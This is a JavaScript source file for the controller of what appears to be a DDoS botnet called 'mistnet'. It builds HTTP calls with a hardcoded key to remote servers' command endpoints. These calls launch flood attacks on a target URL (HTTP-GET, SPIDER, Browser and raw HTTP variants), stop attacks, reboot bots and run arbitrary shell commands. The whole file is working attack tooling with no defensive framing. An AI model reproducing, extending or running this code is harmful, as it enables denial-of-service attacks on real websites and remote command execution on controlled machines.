const axios = require("axios");

class Botnet {
    async start(url, threads, time, method, id, server) {
        url = url.trim();

        const apiURL = method === "HTTP-GET" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/http-get/runScreen ${url} ${time} ${threads} ${id}` 
        : method === "HTTP-GET+" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/httpV2-get/runScreen ${url} ${time} ${threads} ${id}`       
        : method === "SPIDER" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/spider/runScreen ${url} ${time} ${threads} ${id}`
        : method === "SPIDER+" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/spiderV2/runScreen ${url} ${time} ${threads} ${id}`
        : method === "Browser" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/browser/runScreen ${url} ${time} ${threads} ${id}`
        : method === "Browser+" ? 
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/iBrowser/runScreen ${url} ${time} ${threads} ${id}`
        : method === "HTTP-RAW" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/ddosl/runScreen ${url} ${time} ${threads} ${id}`
        : "";

        const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
        if(res && res?.data) return res.data;
        else return false;
    }

    async stop(id, server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=screen -S attack_${id} -X at 0 stuff '^C'`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }

    async stopAll(server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=sudo bash ~/stopall`;
      let err = '';
      const res = await axios.get(apiURL, { timeout: 10000 }).catch((e) => err = e.toString());
      if(err === 'Error: socket hang up') return { success: true }
      else return false;
    }

    async reboot(server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=sudo reboot`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }

    async shell(cmd, server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=${encodeURIComponent(cmd)}`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }
}

module.exports = new Botnet();